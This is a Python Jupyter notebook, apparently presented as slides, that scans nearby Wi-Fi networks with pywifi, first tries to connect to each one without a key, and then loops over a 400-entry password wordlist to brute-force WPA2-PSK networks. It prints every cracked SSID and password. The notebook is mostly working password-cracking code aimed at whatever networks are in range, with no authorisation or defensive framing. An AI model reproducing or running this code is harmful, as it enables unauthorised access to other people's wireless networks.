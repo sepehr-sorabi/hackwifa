{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "outputs": [
    {
     "ename": "ModuleNotFoundError",
     "evalue": "No module named 'comtypes'",
     "output_type": "error",
     "traceback": [
      "\u001b[1;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[1;31mModuleNotFoundError\u001b[0m                       Traceback (most recent call last)",
      "Cell \u001b[1;32mIn[1], line 7\u001b[0m\n\u001b[0;32m      1\u001b[0m \u001b[39mimport\u001b[39;00m \u001b[39mtime\u001b[39;00m\n\u001b[0;32m      2\u001b[0m \u001b[39m#To hault the flow of program\u001b[39;00m\n\u001b[0;32m      3\u001b[0m \u001b[39m#https://docs.python.org/3/library/time.html\u001b[39;00m\n\u001b[0;32m      4\u001b[0m \n\u001b[0;32m      5\u001b[0m \u001b[39m#pip install pywifi\u001b[39;00m\n\u001b[1;32m----> 7\u001b[0m \u001b[39mimport\u001b[39;00m \u001b[39mpywifi\u001b[39;00m\n\u001b[0;32m      8\u001b[0m \u001b[39mfrom\u001b[39;00m \u001b[39mpywifi\u001b[39;00m \u001b[39mimport\u001b[39;00m const\n\u001b[0;32m      9\u001b[0m \u001b[39m#To work with wireless interfaces\u001b[39;00m\n\u001b[0;32m     10\u001b[0m \u001b[39m#https://pypi.org/project/pywifi/\u001b[39;00m\n\u001b[0;32m     11\u001b[0m \u001b[39m#https://github.com/awkman/pywifi/blob/master/DOC.md\u001b[39;00m\n",
      "File \u001b[1;32m~\\AppData\\Local\\Packages\\PythonSoftwareFoundation.Python.3.10_qbz5n2kfra8p0\\LocalCache\\local-packages\\Python310\\site-packages\\pywifi\\__init__.py:15\u001b[0m\n\u001b[0;32m     13\u001b[0m \u001b[39mfrom\u001b[39;00m \u001b[39m.\u001b[39;00m \u001b[39mimport\u001b[39;00m const \n\u001b[0;32m     14\u001b[0m \u001b[39mfrom\u001b[39;00m \u001b[39m.\u001b[39;00m\u001b[39mprofile\u001b[39;00m \u001b[39mimport\u001b[39;00m Profile\n\u001b[1;32m---> 15\u001b[0m \u001b[39mfrom\u001b[39;00m \u001b[39m.\u001b[39;00m\u001b[39mwifi\u001b[39;00m \u001b[39mimport\u001b[39;00m PyWiFi\n\u001b[0;32m     18\u001b[0m \u001b[39mdef\u001b[39;00m \u001b[39mset_loglevel\u001b[39m(level\u001b[39m=\u001b[39mlogging\u001b[39m.\u001b[39mNOTSET):\n\u001b[0;32m     20\u001b[0m     format_pattern \u001b[39m=\u001b[39m \u001b[39m\"\u001b[39m\u001b[39m%(name)s\u001b[39;00m\u001b[39m \u001b[39m\u001b[39m%(asctime)s\u001b[39;00m\u001b[39m \u001b[39m\u001b[39m%(levelname)s\u001b[39;00m\u001b[39m \u001b[39m\u001b[39m%(message)s\u001b[39;00m\u001b[39m\"\u001b[39m\n",
      "File \u001b[1;32m~\\AppData\\Local\\Packages\\PythonSoftwareFoundation.Python.3.10_qbz5n2kfra8p0\\LocalCache\\local-packages\\Python310\\site-packages\\pywifi\\wifi.py:15\u001b[0m\n\u001b[0;32m     12\u001b[0m \u001b[39mimport\u001b[39;00m \u001b[39mplatform\u001b[39;00m\n\u001b[0;32m     13\u001b[0m \u001b[39mimport\u001b[39;00m \u001b[39mlogging\u001b[39;00m\n\u001b[1;32m---> 15\u001b[0m \u001b[39mfrom\u001b[39;00m \u001b[39m.\u001b[39;00m\u001b[39miface\u001b[39;00m \u001b[39mimport\u001b[39;00m Interface\n\u001b[0;32m     18\u001b[0m \u001b[39mif\u001b[39;00m platform\u001b[39m.\u001b[39msystem()\u001b[39m.\u001b[39mlower() \u001b[39m==\u001b[39m \u001b[39m'\u001b[39m\u001b[39mwindows\u001b[39m\u001b[39m'\u001b[39m:\n\u001b[0;32m     19\u001b[0m     \u001b[39mfrom\u001b[39;00m \u001b[39m.\u001b[39;00m \u001b[39mimport\u001b[39;00m _wifiutil_win \u001b[39mas\u001b[39;00m wifiutil\n",
      "File \u001b[1;32m~\\AppData\\Local\\Packages\\PythonSoftwareFoundation.Python.3.10_qbz5n2kfra8p0\\LocalCache\\local-packages\\Python310\\site-packages\\pywifi\\iface.py:11\u001b[0m\n\u001b[0;32m      7\u001b[0m \u001b[39mimport\u001b[39;00m \u001b[39mlogging\u001b[39;00m\n\u001b[0;32m     10\u001b[0m \u001b[39mif\u001b[39;00m platform\u001b[39m.\u001b[39msystem()\u001b[39m.\u001b[39mlower() \u001b[39m==\u001b[39m \u001b[39m'\u001b[39m\u001b[39mwindows\u001b[39m\u001b[39m'\u001b[39m:\n\u001b[1;32m---> 11\u001b[0m     \u001b[39mfrom\u001b[39;00m \u001b[39m.\u001b[39;00m \u001b[39mimport\u001b[39;00m _wifiutil_win \u001b[39mas\u001b[39;00m wifiutil\n\u001b[0;32m     12\u001b[0m \u001b[39melif\u001b[39;00m platform\u001b[39m.\u001b[39msystem()\u001b[39m.\u001b[39mlower() \u001b[39m==\u001b[39m \u001b[39m'\u001b[39m\u001b[39mlinux\u001b[39m\u001b[39m'\u001b[39m:\n\u001b[0;32m     13\u001b[0m     \u001b[39mfrom\u001b[39;00m \u001b[39m.\u001b[39;00m \u001b[39mimport\u001b[39;00m _wifiutil_linux \u001b[39mas\u001b[39;00m wifiutil\n",
      "File \u001b[1;32m~\\AppData\\Local\\Packages\\PythonSoftwareFoundation.Python.3.10_qbz5n2kfra8p0\\LocalCache\\local-packages\\Python310\\site-packages\\pywifi\\_wifiutil_win.py:12\u001b[0m\n\u001b[0;32m     10\u001b[0m \u001b[39mfrom\u001b[39;00m \u001b[39mctypes\u001b[39;00m \u001b[39mimport\u001b[39;00m \u001b[39m*\u001b[39m\n\u001b[0;32m     11\u001b[0m \u001b[39mfrom\u001b[39;00m \u001b[39mctypes\u001b[39;00m\u001b[39m.\u001b[39;00m\u001b[39mwintypes\u001b[39;00m \u001b[39mimport\u001b[39;00m \u001b[39m*\u001b[39m\n\u001b[1;32m---> 12\u001b[0m \u001b[39mfrom\u001b[39;00m \u001b[39mcomtypes\u001b[39;00m \u001b[39mimport\u001b[39;00m GUID\n\u001b[0;32m     14\u001b[0m \u001b[39mfrom\u001b[39;00m \u001b[39m.\u001b[39;00m\u001b[39mconst\u001b[39;00m \u001b[39mimport\u001b[39;00m \u001b[39m*\u001b[39m\n\u001b[0;32m     15\u001b[0m \u001b[39mfrom\u001b[39;00m \u001b[39m.\u001b[39;00m\u001b[39mprofile\u001b[39;00m \u001b[39mimport\u001b[39;00m Profile\n",
      "\u001b[1;31mModuleNotFoundError\u001b[0m: No module named 'comtypes'"
     ]
    }
   ],
   "source": [
    "import time\n",
    "#To hault the flow of program\n",
    "#https://docs.python.org/3/library/time.html\n",
    "\n",
    "#pip install pywifi\n",
    "\n",
    "import pywifi\n",
    "from pywifi import const\n",
    "#To work with wireless interfaces\n",
    "#https://pypi.org/project/pywifi/\n",
    "#https://github.com/awkman/pywifi/blob/master/DOC.md"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "outputs": [],
   "source": [
    "available_devices = []\n",
    "keys = []\n",
    "final_output = {}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "#### Get interface information"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [],
   "source": [
    "wifi = pywifi.PyWiFi()\n",
    "interface = wifi.interfaces()[0]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "##### In general, there will be only one Wi-Fi interface in the platform. Thus, use index 0 to obtain the Wi-Fi interface. "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "### Get the name of the Wi-Fi interface."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [],
   "source": [
    "print(interface.name())"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "### Now let's scan the network."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "outputs": [],
   "source": [
    "interface.scan()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [],
   "source": [
    "time.sleep(5) \n",
    "#Because the scan time for each Wi-Fi interface is variant. \n",
    "#It is safer to call scan_results() 2 ~ 8 seconds later after calling scan()."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "### Obtain the results of the previous triggerred scan. A Profile list will be returned."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [],
   "source": [
    "x = interface.scan_results()\n",
    "print(type(x))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "## Let's see all network Profiles"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [],
   "source": [
    "for i in x:\n",
    "    #print(i.ssid)\n",
    "    available_devices.append(i.ssid)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "outputs": [],
   "source": [
    "for i in available_devices:\n",
    "    print (\"{:<5} => {:}\".format(\"Host Name\", i))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "outputs": [],
   "source": [
    "for i in available_devices:\n",
    "    nm = i\n",
    "    i=i.strip()\n",
    "    profile = pywifi.Profile()\n",
    "    profile.ssid = i\n",
    "    profile.auth = const.AUTH_ALG_OPEN\n",
    "    profile.akm.append(const.AKM_TYPE_NONE)\n",
    "    wifi = pywifi.PyWiFi()\n",
    "    iface = wifi.interfaces()[0]\n",
    "    iface.remove_all_network_profiles()\n",
    "    profile = iface.add_network_profile(profile)\n",
    "    iface.connect(profile)\n",
    "    time.sleep(4)\n",
    "    if iface.status() == const.IFACE_CONNECTED:\n",
    "        print('success password of the network',i,' is',\"none\")\n",
    "        final_output[i] = \"\"\n",
    "        available_devices.remove(nm)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# step-2"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "outputs": [],
   "source": [
    "with open('top400.txt','r') as f:\n",
    "    for i in f:\n",
    "        i = i.replace('\\n','')\n",
    "        if i not in keys:\n",
    "            keys.append(i)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [],
   "source": [
    "print(keys)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "outputs": [],
   "source": [
    "try:\n",
    "    for i in available_devices:\n",
    "        profile = pywifi.Profile()\n",
    "        i=i.strip()\n",
    "        profile.ssid = i\n",
    "        profile.auth = const.AUTH_ALG_OPEN\n",
    "        profile.akm.append(const.AKM_TYPE_WPA2PSK)\n",
    "        profile.cipher = const.CIPHER_TYPE_CCMP\n",
    "        flag=0\n",
    "        for j in keys:\n",
    "            j=j.strip()\n",
    "            profile.key = j\n",
    "            wifi = pywifi.PyWiFi()\n",
    "            iface = wifi.interfaces()[0]\n",
    "            iface.remove_all_network_profiles()\n",
    "            profile = iface.add_network_profile(profile)\n",
    "\n",
    "            iface.connect(profile)\n",
    "            time.sleep(4)\n",
    "            if iface.status() == const.IFACE_CONNECTED:\n",
    "                print('success password of the network',i,' is',j)\n",
    "                final_output[i] = j\n",
    "                flag=1\n",
    "                break\n",
    "except Exception as e:\n",
    "    print(e)\n",
    "        #if flag == 0:\n",
    "        #print('sorry we are not able to CRACK PASSWORD of',i)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "outputs": [],
   "source": [
    "print('*'*10,'Discovered Password','*'*10)\n",
    "print(\"{0:<12} {1:<}\".format(\"HOST NAME\",\"PASSWORD\"))\n",
    "for SSID,Key in final_output.items():\n",
    "    print (\"{:<12}|{:<12}\".format(SSID, Key))\n",
    "available_devices.clear()"
   ]
  }
 ],
 "metadata": {
  "celltoolbar": "Slideshow",
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.10"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
